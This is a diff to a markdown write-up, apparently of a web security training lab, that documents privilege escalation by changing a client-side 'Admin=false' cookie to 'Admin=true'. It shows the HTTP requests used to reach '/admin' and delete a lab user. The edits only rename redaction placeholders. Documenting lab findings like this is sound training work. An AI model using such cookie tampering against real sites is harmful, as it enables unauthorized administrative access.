@@ -17,28 +17,28 @@ By tampering with this value, a normal user can access admin functionality and p
 5. Visit `/admin` again and confirm admin panel access.
 6. Perform a privileged action (in the lab: delete user `carlos`).
 
-## Evidence (sanitized)
+## Evidence
 ### Baseline (non-admin)
-Request (sanitized):
+Request:
 ```http
 GET /admin HTTP/2
 Host: <lab-host>
-Cookie: Admin=false; session=<redacted>
+Cookie: Admin=false; session=<session>
 ```
 
 Expected result: access denied (e.g., 401/403 or redirect).
 
 ### Privilege escalation (admin flag tampering)
-**TODO (add from Burp, sanitized):**
+**TODO (add from Burp):**
 1) Login response sets a forgeable admin indicator:
 ```http
-Set-Cookie: Admin=false; session=<redacted>
+Set-Cookie: Admin=false; session=<session>
 ```
 2) After tampering the flag:
 ```http
 GET /admin HTTP/2
 Host: <lab-host>
-Cookie: Admin=true; session=<redacted>
+Cookie: Admin=true; session=<session>
 ```
 Observed result: admin panel accessible (e.g., 200 OK) and privileged action possible (lab: delete `carlos`).
 
